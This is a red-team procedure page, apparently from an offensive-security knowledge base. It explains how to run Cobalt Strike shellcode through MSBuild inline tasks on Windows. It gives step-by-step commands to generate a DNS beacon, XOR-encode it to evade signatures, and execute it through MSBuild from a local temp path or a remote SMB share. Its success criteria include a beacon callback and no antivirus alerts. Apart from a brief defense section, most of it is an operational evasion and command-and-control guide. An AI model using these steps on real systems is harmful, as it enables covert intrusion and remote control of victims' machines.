---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:16.393687+00:00'
updated_at: '2023-04-10T20:36:24.555346+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Trusted Developer Utilities|T1127 - Trusted Developer
    Utilities]]
sub_techniques: []
tags:
  - '[[tags/Cobalt Strike]]'
  - '[[tags/Custom Payloads]]'
  - '[[tags/Payloads]]'
commands:
  - '[[commands/generate-encoded-shellcode]]'
  - '[[commands/msbuild-execute-x64-dns-payload]]'
  - '[[commands/msbuild-execute-x86-dns-payload]]'
platforms:
  - Windows
tools:
  - '[[tools/cobalt-strike]]'
validated: true
---

# MSBuild Shellcode Execution

## Summary

This procedure uses MSBuild, a legitimate .NET build tool, to execute shellcode embedded in an XML project file on a Windows target. It allows attackers to run arbitrary code without dropping executable files to disk, evading detection by application whitelisting and file-based defenses. The shellcode is generated via Cobalt Strike, encoded to avoid static signatures, and then executed through MSBuild's inline task capabilities.

## Description

MSBuild.exe is a command-line utility for building .NET applications and projects defined in XML files. Attackers can abuse it by crafting an XML file that defines an inline task to allocate memory, copy the shellcode, and execute it using .NET reflection or unsafe code. This technique is particularly effective in environments where MSBuild is whitelisted as a trusted developer tool. The process starts with generating a raw shellcode payload (e.g., a stageless beacon) using Cobalt Strike, encoding it with XOR or similar to obfuscate, embedding the encoded bytes into the XML, and finally invoking MSBuild on the target to trigger execution. This can lead to command-and-control (C2) establishment or further post-exploitation activities. It targets Windows systems with .NET Framework 4.0+ installed, typically on domain-joined workstations or servers.

## Requirements

1. Initial access to the target Windows system (e.g., via RDP, SMB, or compromised credentials) with local execution privileges.
2. .NET Framework 4.0 or later installed on the target (standard on Windows 7+).
3. Attacker-controlled Cobalt Strike instance for payload generation.
4. Shellcode encoder script (shellcode_encoder.py) on the attacker machine.
5. Network access if using remote XML shares for x86 execution.

## Defense

- Disable or restrict MSBuild execution on endpoints via Group Policy or AppLocker, allowing only signed or specific paths.
- Implement behavioral monitoring for MSBuild spawning child processes or making unusual network connections (e.g., via EDR tools like Sysmon or Windows Defender).
- Enable .NET logging (Event Tracing for Windows - ETW) to capture inline task executions and assembly loads.
- Scan for anomalous XML files in temp directories or network shares containing base64-encoded or obfuscated payloads.

## Objectives

1. Execute arbitrary shellcode on the target without writing malicious executables to disk.
2. Establish a C2 connection (e.g., DNS beacon) for persistence and lateral movement.
3. Bypass application control and antivirus by leveraging a signed Microsoft binary.

## Instructions

### Step 1: Generate Raw Shellcode Payload

**Context**: Use Cobalt Strike to create a raw shellcode payload, such as a DNS-based stageless beacon, which will be used for C2 communication. This step occurs on the attacker machine and produces a binary file containing the shellcode.

Navigate to Attacks > Packages > Payload Generator in Cobalt Strike to generate the shellcode. Select options for a stageless payload with DNS profile. Alternatively, use Scripted Web Delivery for HTTP-based delivery if needed. Save the output as a binary file (e.g., payload.bin).

**Expected Output**: A raw shellcode binary file ready for encoding.

### Step 2: Encode the Shellcode

**Context**: Encode the raw shellcode to obfuscate it from signature-based detection. This step uses a Python script to apply XOR encoding, generating output in multiple formats including C# for easy embedding in XML.

**Command** ([[commands/generate-encoded-shellcode]]):
```bash
python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
```

> This command processes the input binary, applies XOR with the provided password, and outputs encoded versions in C++, C#, and Python formats. The C# output can be directly embedded as byte arrays in the MSBuild XML.

**Expected Output**: Encoded shellcode files (e.g., payload_encoded.cs) with byte arrays like new byte[] { 0xDE, 0xAD, ... }, plus decoder stubs.

### Step 3: Prepare and Embed Shellcode in XML (x64 Target)

**Context**: Create or modify an MSBuild XML project file to include the encoded shellcode and an inline task that decodes and executes it. This step assumes a template XML with placeholders for the encoded bytes.

Embed the encoded C# byte array from Step 2 into the XML file (e.g., dns_raw_stageless_x64.xml). The XML should define a <UsingTask> referencing a custom task assembly or inline code to perform VirtualAlloc, memcpy, and CreateThread for execution. Place the XML on the target or accessible path (e.g., C:\Windows\Temp\dns_raw_stageless_x64.xml).

**Expected Output**: A valid MSBuild XML file containing the embedded shellcode.

### Step 4: Execute Shellcode via MSBuild (x64 Target)

**Context**: On the target system, invoke MSBuild to build the XML project, triggering the inline task and shellcode execution. This runs in the context of MSBuild, a trusted process.

**Command** ([[commands/msbuild-execute-x64-dns-payload]]):
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
```

> MSBuild parses the XML, executes the inline task, decodes the shellcode, and runs it in memory. Monitor for beacon callbacks in Cobalt Strike.

**Expected Output**: MSBuild completes with "Build succeeded" or minimal output; shellcode executes silently, establishing C2 if successful.

### Step 5: Execute Shellcode via MSBuild (x86 Target)

**Context**: For 32-bit systems or compatibility, use the 32-bit MSBuild path and a network-accessible XML to avoid local writes if needed.

**Command** ([[commands/msbuild-execute-x86-dns-payload]]):
```cmd
%windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

> Similar to x64, but uses 32-bit framework and pulls XML from a share. Ensure the target can access the share.

**Expected Output**: Build success message; shellcode execution and potential C2 callback.

**Success Indicators**:
- No errors from MSBuild (e.g., no "Build failed").
- Incoming beacon or session in Cobalt Strike listener.
- No immediate AV alerts or process termination.
